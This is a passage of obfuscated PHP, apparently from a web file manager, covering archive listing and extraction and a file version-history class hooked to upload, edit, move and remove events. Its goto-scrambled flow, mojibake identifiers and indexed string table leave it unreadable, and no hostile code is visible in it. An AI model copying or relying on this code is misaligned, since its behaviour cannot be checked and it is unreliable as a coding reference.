self::tmpFileName($B‡¬™Ì∂é÷); $cÚ◊â¶∫Ìó = TEMP_FILES . $Aòÿ⁄Ãº≠ú; del_dir($cÚ◊â¶∫Ìó); goto eöÉÿªàá±; CãÈà’ÂÈ‹: foreach ($C£Á¶œ æÜ as $dÈÆæåæ∆â) { $dÈÆæåæ∆â = self::iconvApp($dÈÆæåæ∆â); self::move($dÈÆæåæ∆â, $fë√ﬁî∏Ö√, $B™àåõ›È¢); } del_dir($cÚ◊â¶∫Ìó); if (!$cü»÷ã—◊á) { del_file($f’Æ∑üÑ¨à); } goto Dõﬂ©ªﬁÎ; F¢±Œ«Øæ: if (!($B‡¬™Ì∂é÷ = parent::info($CáªèßàîØ))) { show_json(LNG($aõ≥ﬂèÂ¬¢[1111]), !1); } if (!($FÖœ∑Ïﬂö« = parent::infoFull($fë√ﬁî∏Ö√))) { $fë√ﬁî∏Ö√ = parent::mkdir($fë√ﬁî∏Ö√); $FÖœ∑Ïﬂö« = array($aõ≥ﬂèÂ¬¢[76] => $fë√ﬁî∏Ö√); } else { if (isset($FÖœ∑Ïﬂö«[$aõ≥ﬂèÂ¬¢[397]]) && trim($FÖœ∑Ïﬂö«[$aõ≥ﬂèÂ¬¢[76]], $aõ≥ﬂèÂ¬¢[8]) != trim($fë√ﬁî∏Ö√, $aõ≥ﬂèÂ¬¢[8])) { $cçÈ—∏á£ó = KodIO::make($FÖœ∑Ïﬂö«[$aõ≥ﬂèÂ¬¢[492]]); $C∂∆ëıè©π = parent::fileNameAuto($cçÈ—∏á£ó, $FÖœ∑Ïﬂö«[$aõ≥ﬂèÂ¬¢[28]], REPEAT_RENAME_FOLDER, !0); $fë√ﬁî∏Ö√ = parent::mkdir($cçÈ—∏á£ó . $C∂∆ëıè©π); $FÖœ∑Ïﬂö« = array($aõ≥ﬂèÂ¬¢[76] => $fë√ﬁî∏Ö√); } } $fë√ﬁî∏Ö√ = $FÖœ∑Ïﬂö«[$aõ≥ﬂèÂ¬¢[76]]; goto fæÙäãÉüñ; Cê«À’èØ: if (!@file_exists(self::iconvSystem($f’Æ∑üÑ¨à))) { $cü»÷ã—◊á = self::localFilePath($CáªèßàîØ, $AØÉÒçÂâ£); $f’Æ∑üÑ¨à = $cü»÷ã—◊á ? $cü»÷ã—◊á : parent::download($CáªèßàîØ, $f’Æ∑üÑ¨à); } $f’Æ∑üÑ¨à = self::iconvSystem($f’Æ∑üÑ¨à); $cìÕ¶áÜª® = isset($D“¶Íìââ∆[$aõ≥ﬂèÂ¬¢[1112]]) ? $D“¶Íìââ∆[$aõ≥ﬂèÂ¬¢[1112]] : $aõ≥ﬂèÂ¬¢[1113]; goto a©ä¶†∑¢à; eöÉÿªàá±: mk_dir($cÚ◊â¶∫Ìó); $AØÉÒçÂâ£ = self::fileExt($B‡¬™Ì∂é÷); $f’Æ∑üÑ¨à = $cÚ◊â¶∫Ìó . $aõ≥ﬂèÂ¬¢[95] . $AØÉÒçÂâ£; goto Cê«À’èØ; CàµøƒÑ¿å: } public static function unzipList($EΩúØ≈†‘é) { goto c⁄Àä°òêÌ; fƒ¬ÏÙºñí: $F£„Ö°ãÇ = json_encode($EÑ ¢Øôã‡[$dÑœ‹‚Ÿ÷°[1116]]); self::setContent($f∏ŸÃûêπì, $F£„Ö°ãÇ); if (count($EÑ ¢Øôã‡[$dÑœ‹‚Ÿ÷°[1116]]) >= $e∑Œç∑Çç¯) { show_json(sprintf(LNG($dÑœ‹‚Ÿ÷°[1120]), count($EÑ ¢Øôã‡[$dÑœ‹‚Ÿ÷°[1116]])), !1); } goto Fﬁ∆Õœ„¯¢; CØäŒ¶®÷´: if (!is_dir($dô•Öø’¶ö)) { mk_dir($dô•Öø’¶ö); } $d¥¿«ƒ´åÁ = $dô•Öø’¶ö . $dÑœ‹‚Ÿ÷°[8] . $Eëãß„Ë±∆; if (!@file_exists(self::iconvSystem($d¥¿«ƒ´åÁ))) { if (isset($cÓùÛ¨º∏æ)) { url_request($B®€¯âú⁄Œ, $dÑœ‹‚Ÿ÷°[1121], $d¥¿«ƒ´åÁ); } else { $c∂§äÉ≠„… = self::localFilePath($B®€¯âú⁄Œ, $CÏ «Øœ∫); $d¥¿«ƒ´åÁ = $c∂§äÉ≠„… ? $c∂§äÉ≠„… : self::download($B®€¯âú⁄Œ, $d¥¿«ƒ´åÁ); } } goto D’Î¨øôÙî; E°∏≈Ó„ãÒ: self::archiveExt(); del_dir($dô•Öø’¶ö); if (!$EÑ ¢Øôã‡[$dÑœ‹‚Ÿ÷°[1114]]) { show_json($EÑ ¢Øôã‡[$dÑœ‹‚Ÿ÷°[1116]], !1); } goto fƒ¬ÏÙºñí; D’Î¨øôÙî: $d¥¿«ƒ´åÁ = self::iconvSystem($d¥¿«ƒ´åÁ); if ($Fèøõ˘Ω©› >= 0) { $A≥–Ößé¬Ò = isset($EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[1122]]) ? $EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[1122]] : !1; $e§âÚõ∆é≠ = isset($EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[28]]) ? $EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[28]] : $dÑœ‹‚Ÿ÷°[33]; KodArchive::filePreview($d¥¿«ƒ´åÁ, $Fèøõ˘Ω©›, $A≥–Ößé¬Ò, $e§âÚõ∆é≠); self::archiveExt(); die; } $EÑ ¢Øôã‡ = KodArchive::listContent($d¥¿«ƒ´åÁ); goto E°∏≈Ó„ãÒ; E©óÜÚ»≥œ: $e∑Œç∑Çç¯ = 50000; if (request_url_safe($B®€¯âú⁄Œ)) { $cÓùÛ¨º∏æ = parse_url_query($B®€¯âú⁄Œ); if (!isset($cÓùÛ¨º∏æ[$dÑœ‹‚Ÿ÷°[76]])) { show_json($dÑœ‹‚Ÿ÷°[1119], !1); } } $Fÿπè¢√óö = isset($cÓùÛ¨º∏æ) ? $cÓùÛ¨º∏æ[$dÑœ‹‚Ÿ÷°[76]] : $B®€¯âú⁄Œ; goto D‚ÉÂÈ‡í»; c⁄Àä°òêÌ: $dÑœ‹‚Ÿ÷° =& $_SERVER[’ÿƒ†ïò]; $B®€¯âú⁄Œ = $EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[76]]; $Fèøõ˘Ω©› = isset($EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[1118]]) ? $EΩúØ≈†‘é[$dÑœ‹‚Ÿ÷°[1118]] : -1; goto E©óÜÚ»≥œ; b◊É›†ÆìÏ: if (isset($cÓùÛ¨º∏æ)) { $Bá–óﬁÒ≠‚ = array($cÓùÛ¨º∏æ[$dÑœ‹‚Ÿ÷°[76]], $cÓùÛ¨º∏æ[$dÑœ‹‚Ÿ÷°[1118]], $cÓùÛ¨º∏æ[$dÑœ‹‚Ÿ÷°[28]]); $Eëãß„Ë±∆ = md5(implode($dÑœ‹‚Ÿ÷°[71], $Bá–óﬁÒ≠‚)) . $dÑœ‹‚Ÿ÷°[95] . get_path_ext($cÓùÛ¨º∏æ[$dÑœ‹‚Ÿ÷°[28]]); } else { $Bá–óﬁÒ≠‚ = array($d‘™ã´∞ÈÙ[$dÑœ‹‚Ÿ÷°[28]], $d‘™ã´∞ÈÙ[$dÑœ‹‚Ÿ÷°[76]], $d‘™ã´∞ÈÙ[$dÑœ‹‚Ÿ÷°[78]]); $Eëãß„Ë±∆ = md5(implode($dÑœ‹‚Ÿ÷°[71], $Bá–óﬁÒ≠‚)) . $dÑœ‹‚Ÿ÷°[95] . $CÏ «Øœ∫; } if ($Fèøõ˘Ω©› == -1) { $f∏ŸÃûêπì = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\x69\145\167\x2f{$Eéâ¥‹Èî‡}\x2f{$Eëãß„Ë±∆}\56\154\x6f\x67"; $bﬁœ´Öÿà’ = self::infoFull($f∏ŸÃûêπì); if ($bﬁœ´Öÿà’) { $f∏ŸÃûêπì = $bﬁœ´Öÿà’[$dÑœ‹‚Ÿ÷°[76]]; $e»æº¥°©… = self::getContent($f∏ŸÃûêπì); if ($e»æº¥°©…) { $F£„Ö°ãÇ = json_decode($e»æº¥°©…, !0); if (count($F£„Ö°ãÇ) >= $e∑Œç∑Çç¯) { show_json(sprintf(LNG($dÑœ‹‚Ÿ÷°[1120]), count($F£„Ö°ãÇ)), !1); } return $F£„Ö°ãÇ; } } else { $f∏ŸÃûêπì = self::mkfile($f∏ŸÃûêπì); } } $dô•Öø’¶ö = TEMP_FILES . $Eéâ¥‹Èî‡; goto CØäŒ¶®÷´; D‚ÉÂÈ‡í»: $d‘™ã´∞ÈÙ = self::info($Fÿπè¢√óö); $CÏ «Øœ∫ = self::fileExt($d‘™ã´∞ÈÙ); $Eéâ¥‹Èî‡ = self::tmpFileName($d‘™ã´∞ÈÙ); goto b◊É›†ÆìÏ; Fﬁ∆Õœ„¯¢: return $EÑ ¢Øôã‡[$dÑœ‹‚Ÿ÷°[1116]]; goto D¨†î¡°°ø; D¨†î¡°°ø: } private static function fileExt($Dßêáíú÷Î) { $A√ã∞·†¯µ =& $_SERVER[’ÿƒ†ïò]; $aåäìÕ‘†◊ = $Dßêáíú÷Î[$A√ã∞·†¯µ[168]]; if ($aåäìÕ‘†◊ == $A√ã∞·†¯µ[1123]) { $Fëö»≤Àÿê = $A√ã∞·†¯µ[1124]; if (substr($Dßêáíú÷Î[$A√ã∞·†¯µ[28]], -strlen($Fëö»≤Àÿê)) == $Fëö»≤Àÿê) { $aåäìÕ‘†◊ = $A√ã∞·†¯µ[1125]; } } self::archiveExt($aåäìÕ‘†◊); return $aåäìÕ‘†◊; } private static function zipFileList($FÏø“ó›èÕ, $E„®´´ﬂ¢Ï = false) { $Dè©⁄Ò¬ª‚ =& $_SERVER[’ÿƒ†ïò]; $dáÈ„”ÏÁÙ = array(); foreach ($FÏø“ó›èÕ as $eàãäÕ÷πÔ) { $E¿≈ãÍÈ∞„ = $eàãäÕ÷πÔ[$Dè©⁄Ò¬ª‚[76]]; if ($E„®´´ﬂ¢Ï) { $E¿≈ãÍÈ∞„ = self::copy($eàãäÕ÷πÔ[$Dè©⁄Ò¬ª‚[76]], $E„®´´ﬂ¢Ï, $Dè©⁄Ò¬ª‚[813]); } else { $dÇÔ„’ÛÂ± = self::init($eàãäÕ÷πÔ[$Dè©⁄Ò¬ª‚[76]]); if ($dÇÔ„’ÛÂ±->getType() == $Dè©⁄Ò¬ª‚[106]) { $E¿≈ãÍÈ∞„ = $dÇÔ„’ÛÂ±->path; } } if ($E¿≈ãÍÈ∞„ && self::local()->exist($E¿≈ãÍÈ∞„)) { $dáÈ„”ÏÁÙ[$eàãäÕ÷πÔ[$Dè©⁄Ò¬ª‚[76]]] = $E¿≈ãÍÈ∞„; } } if (!empty($dáÈ„”ÏÁÙ)) { return array_values($dáÈ„”ÏÁÙ); } show_json(LNG($Dè©⁄Ò¬ª‚[1089]), !1); } public static function tmpFileName($Füäû¬•ê¯) { $dµÈ∑Ê∂ªä =& $_SERVER[’ÿƒ†ïò]; $cÉ¢ª•ÉÎ— = array($Füäû¬•ê¯[$dµÈ∑Ê∂ªä[28]], $Füäû¬•ê¯[$dµÈ∑Ê∂ªä[76]], $Füäû¬•ê¯[$dµÈ∑Ê∂ªä[78]], $Füäû¬•ê¯[$dµÈ∑Ê∂ªä[515]]); return md5(implode($dµÈ∑Ê∂ªä[71], $cÉ¢ª•ÉÎ—)); } private static function localFilePath($Fñ©ßì˘¬·, $c±ÇÔ®Á„¯) { goto F»Í»Ó›úç; Aº÷üÇË≠è: if ($eüù—Ë¯Œ¡[$f©⁄æ‹àáº[29]] == KodIO::KOD_SOURCE) { $bû≤ûâ¡â¶ = Model($f©⁄æ‹àáº[820])->fileInfoGet(KodIO::sourceID($Fñ©ßì˘¬·)); if (!$bû≤ûâ¡â¶[$f©⁄æ‹àáº[76]]) { show_json($f©⁄æ‹àáº[1128], !1); } $Fñ©ßì˘¬· = $bû≤ûâ¡â¶[$f©⁄æ‹àáº[76]]; } $fâÃéÕ£Û„ = self::init($Fñ©ßì˘¬·); $f≥ìƒâ∑åæ = $fâÃéÕ£Û„->getType(); goto b™Öéìº®†; F»Í»Ó›úç: $f©⁄æ‹àáº =& $_SERVER[’ÿƒ†ïò]; if ($c±ÇÔ®Á„¯ == $f©⁄æ‹àáº[1126] && strtoupper(substr(PHP_OS, 0, 3)) == $f©⁄æ‹àáº[1127]) { return !1; } $eüù—Ë¯Œ¡ = KodIO::parse($Fñ©ßì˘¬·); goto Aº÷üÇË≠è; b™Öéìº®†: if ($f≥ìƒâ∑åæ == $f©⁄æ‹àáº[106] || $f≥ìƒâ∑åæ == $f©⁄æ‹àáº[1129]) { if (!$fâÃéÕ£Û„->exist($fâÃéÕ£Û„->path)) { show_json(LNG($f©⁄æ‹àáº[105]), !1); } return $fâÃéÕ£Û„->path; } return !1; goto A∆Üƒ€†Ö”; A∆Üƒ€†Ö”: } private static function archiveExt($c≈∫€Îç¡ä = '') { $GLOBALS[$_SERVER[’ÿƒ†ïò][1130]] = $c≈∫€Îç¡ä; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto C¡Ω∑¥Ü™Ê; fàèŒ¢œùò: Hook::bind($aèâ†∆ŸÛò[1136], $aèâ†∆ŸÛò[1137]); Hook::bind($aèâ†∆ŸÛò[1138], $aèâ†∆ŸÛò[1139]); Hook::bind($aèâ†∆ŸÛò[1140], $aèâ†∆ŸÛò[1141]); goto b≠√‚Æ°ïÒ; C¡Ω∑¥Ü™Ê: $aèâ†∆ŸÛò =& $_SERVER[’ÿƒ†ïò]; $F‘øÊÕÌ‰„ = $GLOBALS[$aèâ†∆ŸÛò[6]][$aèâ†∆ŸÛò[88]]; if ($F‘øÊÕÌ‰„[$aèâ†∆ŸÛò[1131]] != 1) { return; } goto a–ç†–≈ØÜ; b≠√‚Æ°ïÒ: Hook::bind($aèâ†∆ŸÛò[1142], $aèâ†∆ŸÛò[1143]); Hook::bind($aèâ†∆ŸÛò[1144], $aèâ†∆ŸÛò[1145]); goto b‹£è›‚ƒ∏; a–ç†–≈ØÜ: if ($F‘øÊÕÌ‰„[$aèâ†∆ŸÛò[1132]] <= 0) { return; } if (isset($_REQUEST[$aèâ†∆ŸÛò[1133]]) && $_REQUEST[$aèâ†∆ŸÛò[1133]] == $aèâ†∆ŸÛò[87]) { return; } Hook::bind($aèâ†∆ŸÛò[1134], $aèâ†∆ŸÛò[1135]); goto fàèŒ¢œùò; b‹£è›‚ƒ∏: } public static function eventBeforeUpload($c°πõâÉ∞) { if ($c°πõâÉ∞[3] && $c°πõâÉ∞[3] != REPEAT_REPLACE) { return; } $e≥ÜÕâƒâ• = self::parsePath($c°πõâÉ∞[0]); if (!$e≥ÜÕâƒâ•) { return; } self::add($e≥ÜÕâƒâ•); } public static function eventBeforeEdit($CÆŸﬁìŸæê) { $fÑÀ‚˜§ö = self::parsePath($CÆŸﬁìŸæê[0]); if (!$fÑÀ‚˜§ö) { return; } self::add($fÑÀ‚˜§ö); } public static function eventBeforeCopyFile($CÇ…‡›‚Ûæ, $DÙ⁄ÏÊá®, $fﬂ¥… ‚»ê, $cÕ ÎÇˆå∑, $D€ñÿ¿ÉàÛ, $aîƒ≈Ã∞¢À) { $Bœ≠—Ô¬ÕË = $fﬂ¥… ‚»ê->getPathOuter($cÕ ÎÇˆå∑); $EªçÌÏﬁ—˘ = self::parsePath($Bœ≠—Ô¬ÕË); if (!$EªçÌÏﬁ—˘) { return; } self::add($EªçÌÏﬁ—˘); } public static function eventBeforeRename($E¥≥òÜíΩ¢) { $Fä¢π˘à“Ú =& $_SERVER[’ÿƒ†ïò]; $FíêıÛ—†Ù = self::parsePath($E¥≥òÜíΩ¢[0]); if (!$FíêıÛ—†Ù) { return; } $f≥©â¡ƒ‰É = self::checkInHistory($FíêıÛ—†Ù); if (!$f≥©â¡ƒ‰É) { return; } if ($f≥©â¡ƒ‰É[$Fä¢π˘à“Ú[29]] == $Fä¢π˘à“Ú[193]) { $dÒôÇ•Òß≠ = self::listData($FíêıÛ—†Ù); if ($dÒôÇ•Òß≠ && $dÒôÇ•Òß≠[$Fä¢π˘à“Ú[367]]) { self::moveHistory($FíêıÛ—†Ù, $E¥≥òÜíΩ¢[1]); } } else { IO::rename($f≥©â¡ƒ‰É[$Fä¢π˘à“Ú[76]], $E¥≥òÜíΩ¢[1]); } } public static function eventBeforeMove($fêÈ™èøéñ) { goto C‘óå™œÜŒ; a¨å£πŸ∑Ã: $fç®éÇˆ›ú = self::checkInHistory($aø≤Ç’ß…Â); if (!$fç®éÇˆ›ú) { return; } $aÜÜ±å‰ü– = self::pathHistory($e‘úúèˆ∑É); goto Dô‘ªò≈Ö¥; C•ﬁØéÀﬂÓ: $e‘úúèˆ∑É = self::parsePath($fêÈ™èøéñ[1]); if (!$e‘úúèˆ∑É) { return; } $c»åÕ⁄ºΩá = $fêÈ™èøéñ[3]; goto a¨å£πŸ∑Ã; C‘óå™œÜŒ: $c‡¡ºÕ™∑ê =& $_SERVER[’ÿƒ†ïò]; $aø≤Ç’ß…Â = self::parsePath($fêÈ™èøéñ[0]); if (!$aø≤Ç’ß…Â) { return; } goto C•ﬁØéÀﬂÓ; Dô‘ªò≈Ö¥: if ($fç®éÇˆ›ú[$c‡¡ºÕ™∑ê[29]] == $c‡¡ºÕ™∑ê[193]) { $c–§≠‡ï†Ö = self::listData($aø≤Ç’ß…Â); $càù††Â∞∂ = rtrim($e‘úúèˆ∑É, $c‡¡ºÕ™∑ê[8]) . $c‡¡ºÕ™∑ê[8] . ($c»åÕ⁄ºΩá ? $c»åÕ⁄ºΩá : get_path_this($aø≤Ç’ß…Â)); $Aû†ìﬂ¨Õ’ = self::listData($càù††Â∞∂); if ($c–§≠‡ï†Ö && $c–§≠‡ï†Ö[$c‡¡ºÕ™∑ê[367]] && $Aû†ìﬂ¨Õ’ && $Aû†ìﬂ¨Õ’[$c‡¡ºÕ™∑ê[367]]) { return self::clear($aø≤Ç’ß…Â); } if ($c–§≠‡ï†Ö && $c–§≠‡ï†Ö[$c‡¡ºÕ™∑ê[367]]) { self::moveHistory($aø≤Ç’ß…Â, $c»åÕ⁄ºΩá, $aÜÜ±å‰ü–); } } else { IO::move($fç®éÇˆ›ú[$c‡¡ºÕ™∑ê[76]], $aÜÜ±å‰ü–, !1, $c»åÕ⁄ºΩá); self::clearEmptyFolder(IO::pathFather($fç®éÇˆ›ú[$c‡¡ºÕ™∑ê[76]])); } goto CÕßá›èñ“; CÕßá›èñ“: } public static function eventAfterRemove($a∂‚Ù£Çª®, $aç≤†®•ä¯) { goto eÀπ”Ï¡ßã; F«ÁÇáıî–: if (!$BÚƒ⁄Ù±∫€) { return; } $dë£◊Ö–≥Ñ = self::checkInHistory($BÚƒ⁄Ù±∫€); if (!$dë£◊Ö–≥Ñ) { return; } goto còâÒå€É©; eÀπ”Ï¡ßã: $d∆Ñãã©µ√ =& $_SERVER[’ÿƒ†ïò]; if (!$aç≤†®•ä¯) { return; } $BÚƒ⁄Ù±∫€ = self::parsePath($a∂‚Ù£Çª®[0]); goto F«ÁÇáıî–; còâÒå€É©: if ($dë£◊Ö–≥Ñ[$d∆Ñãã©µ√[29]] == $d∆Ñãã©µ√[193]) { $D¬≈»ÏÖ«£ = self::listData($BÚƒ⁄Ù±∫€, !1); if ($D¬≈»ÏÖ«£ && $D¬≈»ÏÖ«£[$d∆Ñãã©µ√[367]]) { self::clear($BÚƒ⁄Ù±∫€, !1); } } else { IO::remove($dë£◊Ö–≥Ñ[$d∆Ñãã©µ√[76]]); self::clearEmptyFolder(IO::pathFather($dë£◊Ö–≥Ñ[$d∆Ñãã©µ√[76]])); } goto BŸ‰ÚÜ≥Ìº; BŸ‰ÚÜ≥Ìº: } private static function checkInHistory($fõÛ«ºéﬁœ) { $D¶Çá∫ÒÉ… = self::pathHistory($fõÛ«ºéﬁœ); if (!IO::exist($D¶Çá∫ÒÉ…)) { $D¶Çá∫ÒÉ… .= $_SERVER[’ÿƒ†ïò][1146]; } return IO::exist($D¶Çá∫ÒÉ…) ? IO::info($D¶Çá∫ÒÉ…) : !1; } private static function parsePath($E≥€ê”Õ“à) { goto E§«∂√’†¥; E§«∂√’†¥: $d ú¿¯ª√‘ =& $_SERVER[’ÿƒ†ïò]; if (!$E≥€ê”Õ“à) { return !1; } if ($GLOBALS[$d ú¿¯ª√‘[1147]]) { return; } goto CÎ—’ÖÃΩ ; E©≈Ü“ÿÙó: if (!$eÜ»·Í€—à || !$d®æÿ¶Ñìó[$d ú¿¯ª√‘[1148]]) { return !1; } if (substr($E≥€ê”Õ“à, 0, strlen(DATA_PATH . $d ú¿¯ª√‘[1149])) == DATA_PATH . $d ú¿¯ª√‘[1149]) { return !1; } if ($b·ú∑Ñ–±€ == KodIO::KOD_SHARE_ITEM) { $EﬂΩ≤ô«π≠ = IO::init($E≥€ê”Õ“à); if ($EﬂΩ≤ô«π≠->pathParse[$d ú¿¯ª√‘[1076]]) { return self::parsePath($EﬂΩ≤ô«π≠->pathParse[$d ú¿¯ª√‘[1076]]); } return !1; } goto bË Ÿì˜ù€; bË Ÿì˜ù€: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $f€—ë‘ß‰ª = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $d ú¿¯ª√‘[1150]); foreach ($f€—ë‘ß‰ª as $aïµÀåó”) { if (!$b·ú∑Ñ–±€ && substr($E≥€ê”Õ“à, 0, strlen($aïµÀåó”)) == $aïµÀåó”) { return !1; } } goto cá„ÁΩùøÖ; CÎ—’ÖÃΩ : $d®æÿ¶Ñìó = KodIO::parse($E≥€ê”Õ“à); $b·ú∑Ñ–±€ = $d®æÿ¶Ñìó[$d ú¿¯ª√‘[29]]; $eÜ»·Í€—à = !$b·ú∑Ñ–±€ || $b·ú∑Ñ–±€ == KodIO::KOD_IO || $b·ú∑Ñ–±€ == KodIO::KOD_SHARE_ITEM; goto E©≈Ü“ÿÙó; cá„ÁΩùøÖ: self::log($GLOBALS[$d ú¿¯ª√‘[1071]] . $d ú¿¯ª√‘[1151] . $E≥€ê”Õ“à); return $E≥€ê”Õ“à; goto d≈·ºñã¡Ú; d≈·ºñã¡Ú: } private static function pathHistory($E”√ãÁµï™) { $E¡ü êÊ¶ƒ =& $_SERVER[’ÿƒ†ïò]; $Døœç≤€†¿ = self::$_historyBase . ltrim(KodIO::clear($E”√ãÁµï™), $E¡ü êÊ¶ƒ[8]); $Døœç≤€†¿ = str_replace(array($E¡ü êÊ¶ƒ[1152]), array($E¡ü êÊ¶ƒ[1153]), $Døœç≤€†¿); return $Døœç≤€†¿; } public static function log($CãúÉæ«°ˆ) { } public static function historyCount($E›•ä°åêÆ) { $d§¨µØà¡¥ =& $_SERVER[’ÿƒ†ïò]; $céü¯¢”àÁ = array(); $AúÚÙúÿÒÚ = array(); foreach ($E›•ä°åêÆ as $C´ó†ı¿’∑) { $Cí∆®úªøƒ = get_path_father($C´ó†ı¿’∑); if (!$AúÚÙúÿÒÚ[$Cí∆®úªøƒ]) { $AúÚÙúÿÒÚ[$Cí∆®úªøƒ] = array(); } $AúÚÙúÿÒÚ[$Cí∆®úªøƒ][] = get_path_this($C´ó†ı¿’∑); } foreach ($AúÚÙúÿÒÚ as $Cí∆®úªøƒ => $eÆø«Úÿ∆ç) { $DŸƒäçªóÑ = self::parsePath($Cí∆®úªøƒ); if (!$DŸƒäçªóÑ) { continue; } foreach ($eÆø«Úÿ∆ç as $Aöªª—Àœí) { $E‹€“ÿØ™£ = self::listData(rtrim($DŸƒäçªóÑ, $d§¨µØà¡¥[8]) . $d§¨µØà¡¥[8] . $Aöªª—Àœí, !1); if ($E‹€“ÿØ™£ && $E‹€“ÿØ™£[$d§¨µØà¡¥[367]]) { $céü¯¢”àÁ[rtrim($Cí∆®úªøƒ, $d§¨µØà¡¥[8]) . $d§¨µØà¡¥[8] . $Aöªª—Àœí] = count($E‹€“ÿØ™£[$d§¨µØà¡¥[367]]); } } } return $céü¯¢”àÁ; } public static function add($d¨≈µî≤ßÊ) { goto bÚ¥≈°ã£Í; bÚ¥≈°ã£Í: $Añ≠≥«µòè =& $_SERVER[’ÿƒ†ïò]; $Bøñ⁄¥¥Ë¿ = self::listData($d¨≈µî≤ßÊ); if (!$Bøñ⁄¥¥Ë¿) { return; } goto aëΩ°“äœ≤; eû÷≠àÔ§ê: $F ˘¬ñá¥Ñ = array($Añ≠≥«µòè[395] => $f¶∆ÏÃ‘ó™, $Añ≠≥«µòè[171] => $Aì◊ßí◊É›, $Añ≠≥«µòè[28] => $F®‰¯ò¡Æí[$Añ≠≥«µòè[28]] . $Añ≠≥«µòè[95] . date($Añ≠≥«µòè[1156]) . rand_string(1), $Añ≠≥«µòè[78] => $F®‰¯ò¡Æí[$Añ≠≥«µòè[78]], $Añ≠≥«µòè[446] => USER_ID, $Añ≠≥«µòè[194] => time(), $Añ≠≥«µòè[1157] => $Añ≠≥«µòè[33]); IO::mkdir($Bøñ⁄¥¥Ë¿[$Añ≠≥«µòè[1158]]); $EåóÕ≤∞ï± = IO::copy($d¨≈µî≤ßÊ, $Bøñ⁄¥¥Ë¿[$Añ≠≥«µòè[1158]], !1, $F ˘¬ñá¥Ñ[$Añ≠≥«µòè[28]]); goto få·ç‚›ØÊ; få·ç‚›ØÊ: if (!$EåóÕ≤∞ï±) { self::clearEmptyFolder($Bøñ⁄¥¥Ë¿[$Añ≠≥«µòè[1158]]); return !1; } array_unshift($CÚçµåû“˜, $F ˘¬ñá¥Ñ); if (count($CÚçµåû“˜) > $dª‡÷ÙÍ∑à) { $B≥åﬁïÙ£ô = array_slice($CÚçµåû“˜, $dª‡÷ÙÍ∑à); foreach ($B≥åﬁïÙ£ô as $FáßÛÙë’‰) { IO::remove($Bøñ⁄¥¥Ë¿[$Añ≠≥«µòè[1158]] . $FáßÛÙë’‰[$Añ≠≥«µòè[28]]); } $CÚçµåû“˜ = array_slice($CÚçµåû“˜, 0, $dª‡÷ÙÍ∑à); } goto eÛøˆÜÍ˘á; bË∂óë∆°Î: if ($f¿Î≠√Ñ…≤ <= 0) { return; } $Aì◊ßí◊É› = IO::hashSimple($d¨≈µî≤ßÊ); $F®‰¯ò¡Æí = IO::info($d¨≈µî≤ßÊ); goto bÏÍÁ´¢‡™; eÛøˆÜÍ˘á: return self::saveData($Bøñ⁄¥¥Ë¿[$Añ≠≥«µòè[1159]], $CÚçµåû“˜); goto Fó°∆∞‘£à; aëΩ°“äœ≤: $d÷ºÿÌà—‹ = Model($Añ≠≥«µòè[758])->get($Añ≠≥«µòè[1154]); $f¿Î≠√Ñ…≤ = $GLOBALS[$Añ≠≥«µòè[6]][$Añ≠≥«µòè[88]][$Añ≠≥«µòè[1132]]; $dª‡÷ÙÍ∑à = $d÷ºÿÌà—‹ == $Añ≠≥«µòè[1155] ? 5 : $f¿Î≠√Ñ…≤; goto bË∂óë∆°Î; d”Ñå∞Ωºô: if ($CÚçµåû“˜ && $CÚçµåû“˜[0][$Añ≠≥«µòè[171]] == $Aì◊ßí◊É›) { return !0; } if (array_key_exists($Añ≠≥«µòè[196], $F®‰¯ò¡Æí) && !$F®‰¯ò¡Æí[$Añ≠≥«µòè[196]]) { return !1; } $f¶∆ÏÃ‘ó™ = short_id(time()); goto eû÷≠àÔ§ê; bÏÍÁ´¢‡™: $CÚçµåû“˜ = $Bøñ⁄¥¥Ë¿[$Añ≠≥«µòè[367]]; if ($F®‰¯ò¡Æí[$Añ≠≥«µòè[78]] == 0) { return; } if ($F®‰¯ò¡Æí[$Añ≠≥«µòè[78]] >= 1024 * 1024 * 500) { return !1; } goto d”Ñå∞Ωºô; Fó°∆∞‘£à: } public static function remove($bïóêá´âÀ, $bﬂÑˆÕ…¢ì) { $C≥Ö≠ﬁää⁄ =& $_SERVER[’ÿƒ†ïò]; $AØÌΩˆ€åË = self::listData($bïóêá´âÀ); $Aéæ∫«ØÊ¡ = array(); if (!$AØÌΩˆ€åË) { return !1; } foreach ($AØÌΩˆ€åË[$C≥Ö≠ﬁää⁄[367]] as $eÃÒ⁄´ÑÛ¥) { if ($eÃÒ⁄´ÑÛ¥[$C≥Ö≠ﬁää⁄[395]] == $bﬂÑˆÕ…¢ì) { IO::remove($AØÌΩˆ€åË[$C≥Ö≠ﬁää⁄[1158]] . $eÃÒ⁄´ÑÛ¥[$C≥Ö≠ﬁää⁄[28]]); continue; } $Aéæ∫«ØÊ¡[] = $eÃÒ⁄´ÑÛ¥; } return self::saveData($AØÌΩˆ€åË[$C≥Ö≠ﬁää⁄[1159]], $Aéæ∫«ØÊ¡); } public static function clear($f÷â–ﬂŸ…è, $C°Æª≈ŸœÎ = true) { $AÔ‚Ôµ’ﬂÑ =& $_SERVER[’ÿƒ†ïò]; $Cã—ÇªØ«à = self::listData($f÷â–ﬂŸ…è, $C°Æª≈ŸœÎ); if (!$Cã—ÇªØ«à) { return !1; } foreach ($Cã—ÇªØ«à[$AÔ‚Ôµ’ﬂÑ[367]] as $eÃÕ∂‹Ï∑¯) { IO::remove($Cã—ÇªØ«à[$AÔ‚Ôµ’ﬂÑ[1158]] . $eÃÕ∂‹Ï∑¯[$AÔ‚Ôµ’ﬂÑ[28]]); } return self::saveData($Cã—ÇªØ«à[$AÔ‚Ôµ’ﬂÑ[1159]], array()); } public static function moveHistory($c¶¢◊¬üÒÍ, $D·®£õÇ∆ﬂ = '', $DÂÉÉñ·ŒÆ = '') { goto AŸÓñŸ…√î; E‹ì°å‚≥‰: $b›ÓãÒ±≈Á = $b…èøÓ≠éõ[1146]; $D·®£õÇ∆ﬂ = $D·®£õÇ∆ﬂ ? $D·®£õÇ∆ﬂ : 